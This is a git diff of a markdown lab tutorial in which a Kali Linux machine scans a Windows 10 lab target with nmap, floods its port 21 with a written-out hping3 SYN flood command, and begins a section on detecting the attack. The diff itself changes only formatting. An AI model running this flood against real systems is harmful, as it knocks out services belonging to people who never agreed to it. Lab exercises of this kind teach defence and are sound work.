@@ -49,24 +49,21 @@ Switch to the Kali Linux and open a new terminal window.
     Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-22 14:02 EST
     Nmap scan report for 10.0.2.45
     Host is up (0.00051s latency).
-
-    PORT   STATE SERVICE
+ PORT   STATE SERVICE
     21/tcp open  ftp
 
-### As you can see above, the port 21 is open.
+** As you can see above, the port 21 is open.**
  2. Perform SYN flooding by typing:
 
 
 ```bash
     hping3 -d 100 -S -p 21 --flood <Windows 10 IP Address>
-
-
 After you enter the command, switch to the Windows 10, observe that the machine is almost frozen, which means that the resources of Windows are completely exhausted. This means that the DoS attack is being successfully performed.
 
 Switch back to the Kali Linux and press Ctrl+C to terminate SYN flooding.
 
-
 ![image](https://github.com/user-attachments/assets/02f9ea62-ad64-46d4-a0e0-96e9a133de7e)
 
 
-## Detecting DoS Attack
+**Detecting DoS Attack**
+
